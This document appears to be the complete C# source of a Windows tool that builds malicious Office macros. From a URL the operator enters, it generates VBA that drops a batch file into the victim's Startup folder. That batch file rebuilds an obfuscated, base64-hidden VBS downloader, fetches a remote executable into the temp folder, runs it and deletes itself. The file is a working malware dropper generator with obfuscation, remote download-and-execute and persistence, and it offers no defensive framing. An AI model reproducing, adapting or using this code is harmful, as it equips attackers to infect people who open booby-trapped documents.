using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing; 
using System.Media;
using System.Runtime.InteropServices;
using System.Text; 
using System.Windows.Forms;

namespace Office_Macro_Downloader {
    public partial class Form1 : Form {
        [DllImport("kernel32")]
        private static extern long WritePrivateProfileString(string section, string key, string val, string filePath); 
        [DllImport("kernel32")]
        private static extern int GetPrivateProfileString(string section, string key, string def, StringBuilder retVal, int size, string filePath);



        bool is_app_loaded = false;

        #region FUNCTIONS
        public string GetINI(string key, string def = "") {
            StringBuilder StrBuild = new StringBuilder(256);
            GetPrivateProfileString("VARIABLES", key, def, StrBuild, 255, Application.StartupPath + "/settings.ini");
            return StrBuild.ToString();
        }
        public void SetINI(string key,string value) {
            WritePrivateProfileString("VARIABLES", key, value, Application.StartupPath + "/settings.ini"); 
        }
        public string RandomFileName( ) { 
            return Guid.NewGuid().ToString("n").Substring(0, 8);
        }

        public List<string> SplitString(string text, int size = 6) {
            List<string> parts = new List<string>();
            for (int i = 0 ; i < text.Length ; i += size) {
                int len = i + size < text.Length ? size : text.Length - i;
                parts.Add(text.Substring(i, len));
            }
            return parts;
        }
        public string ToHex(string text) {
            byte[] ba = Encoding.Default.GetBytes(text);
            var hexString = BitConverter.ToString(ba);
            hexString = hexString.Replace("-", "");
            return hexString;
        }
        #endregion

        public Form1() {
            InitializeComponent();
        }

        #region EVENTS
        private void Form1_Load(object sender, EventArgs e) {
            RandomFileName();
            txtUrl.Text = GetINI("fileurl","https://");
            txtFilename.Text = GetINI("filename", RandomFileName());  
            is_app_loaded = true;
        }

        private void btnRandomFileName_Click(object sender, EventArgs e) {
            txtFilename.Text = RandomFileName();
        }

        private void txtUrl_TextChanged(object sender, EventArgs e) {
            if (is_app_loaded) {
                SetINI("fileurl", txtUrl.Text); 
            }
        }
        private void txtFilename_TextChanged(object sender, EventArgs e) {
            if (is_app_loaded) {
                SetINI("filename", txtFilename.Text); 
            }
        }

        private void btnGenerateCode_Click(object sender, EventArgs e) {
            GenerateBundleCode();
            SystemSounds.Asterisk.Play();
        }
        #endregion


        public void GenerateBundleCode() {
            string vbs_downloader = "RGltIGg6IFNldCBoID0gQ3JlYXRlT2JqZWN0KCJNaWNyb3NvZnQuWE1MSFRUUCIpIApEaW0gczogU2V0IHMgPSBDcmVhdGVPYmplY3QoIkFkb2RiLlN0cmVhbSIpIApoLk9wZW4gIkdFVCIsICIjRklMRV9VUkwjIiwgRmFsc2UgCmguU2VuZCAKZj0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpLkdldFNwZWNpYWxGb2xkZXIoMikgKyAiLyNGSUxFX05BTUUjIiAKV2l0aCBzIAouVHlwZSA9IDEgCi5PcGVuIAoud3JpdGUgaC5yZXNwb25zZUJvZHkgCi5zYXZldG9maWxlIGYsIDIgCkVuZCBXaXRo";
            vbs_downloader = Encoding.UTF8.GetString(Convert.FromBase64String(vbs_downloader));
            vbs_downloader = vbs_downloader.Replace("\r", "").Replace("#FILE_URL#", txtUrl.Text).Replace("#FILE_NAME#", txtFilename.Text+".exe");
            string[] vbs_downloader_lines = vbs_downloader.Split('\n');

            List<string> cmd_lines = new List<string>();
            cmd_lines.Add("echo off");
            cmd_lines.Add(String.Format("del /q/f/s %temp%\\{0}.vbs", txtFilename.Text));
            cmd_lines.Add(String.Format("del /q/f/s %temp%\\{0}.exe", txtFilename.Text));
            cmd_lines.Add(String.Format("SET ff=%temp%\\{0}.vbs", txtFilename.Text));

            
            foreach (string list in vbs_downloader_lines) {
                List<string> words = SplitString(list);
                List<string> part_keys = new List<string>();
                int word_index = 0;
                foreach (string word in words) {
                    if (word.Trim() == "")
                        continue;
                    word_index++;
                    cmd_lines.Add(String.Format("SET p{0}={1}", word_index, word));
                    part_keys.Add(String.Format("%p{0}%", word_index));
                }
                cmd_lines.Add(String.Format("echo {0} >> %ff%", String.Join("", part_keys.ToArray())));
            }
            cmd_lines.Add(String.Format("start /W %temp%\\{0}.vbs", txtFilename.Text));
            cmd_lines.Add(String.Format("start %temp%\\{0}.exe", txtFilename.Text));
            cmd_lines.Add("del %0");

            string generated_cmd_code = String.Join("\n", cmd_lines.ToArray());
             
            string generated_hex_code = ToHex( generated_cmd_code );
            
            List<string> hex_parts = SplitString(generated_hex_code,128);
            List<string> macro_codes = new List<string>();
            macro_codes.Add("Dim sf");
            macro_codes.Add("sf = CreateObject(\"WScript.Shell\").SpecialFolders(\"Startup\")");
            macro_codes.Add(String.Format("Set File = CreateObject(\"Scripting.FileSystemObject\").CreateTextFile(sf & \"\\{0}.bat\", True)", txtFilename.Text));
            int part_index = 0;
            foreach (string part in hex_parts) {
                part_index++;
                macro_codes.Add(String.Format("Dim hex{0}", part_index));
                macro_codes.Add(String.Format("hex{0} = \"{1}\"", part_index, part));
                macro_codes.Add(String.Format("Dim count{0}", part_index));
                macro_codes.Add(String.Format("count{0} = Len(hex{0})", part_index));
                macro_codes.Add(String.Format("For i = 1 To count{0} Step 2", part_index));
                macro_codes.Add(String.Format("\tFile.Write Chr(CInt(\"&h\" & Mid(hex{0},i,2)))", part_index));
                macro_codes.Add(String.Format("Next"));
            }
            macro_codes.Add("File.Close");
            string generated_macro_code = String.Join("\n", macro_codes.ToArray());

            txtGeneratedCode.Text = generated_macro_code;
        }
    }
}
